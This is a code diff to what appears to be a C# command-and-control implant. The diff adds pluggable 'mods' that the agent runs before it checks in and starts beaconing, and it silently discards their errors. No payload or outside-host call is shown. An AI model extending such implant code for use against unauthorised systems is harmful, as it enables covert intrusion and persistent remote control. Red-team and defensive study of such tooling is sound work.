@@ -12,19 +12,21 @@ namespace Agent
     {
         private IAgentConfig config { get; set; }
         private IEnumerable<IProfile> profiles { get; set; }
+        private IEnumerable<IAgentMod> mods { get; set; }   
         private ILogger logger { get; set; }
         private ITaskManager taskManager { get; set; }
         private ITokenManager tokenManager { get; set; }
         private IProfile _profile = null;
 
         //Will need ISocksManager, IRpfwdManager, IForwarderManager
-        public Agent(IEnumerable<IProfile> profiles, ITaskManager taskManager, ILogger logger, IAgentConfig config, ITokenManager tokenManager)
+        public Agent(IEnumerable<IProfile> profiles, ITaskManager taskManager, ILogger logger, IAgentConfig config, ITokenManager tokenManager, IEnumerable<IAgentMod> mods)
         {
             this.profiles = profiles;
             this.taskManager = taskManager;
             this.logger = logger;
             this.config = config;
             this.tokenManager = tokenManager;
+            this.mods = mods;
 
             _profile = SelectProfile(99);
             _profile.SetTaskingReceived += OnTaskingReceived;
@@ -37,6 +39,8 @@ namespace Agent
                 {
                     Environment.Exit(0);
                 }
+
+                await this.ApplyMods();
                 await this.CheckIn();
                 await this._profile.StartBeacon();
             }
@@ -44,6 +48,28 @@ namespace Agent
             {
             }
         }
+
+        private async Task ApplyMods()
+        {
+            if (this.mods == null)
+            {
+                return;
+            }
+
+
+            foreach (var mod in mods)
+            {
+                try
+                {
+                    await mod.Go();
+                }
+                catch
+                {
+
+                }
+            }
+        }
+
         private IProfile SelectProfile(int index)
         {
             if (index == 99) //Default Value
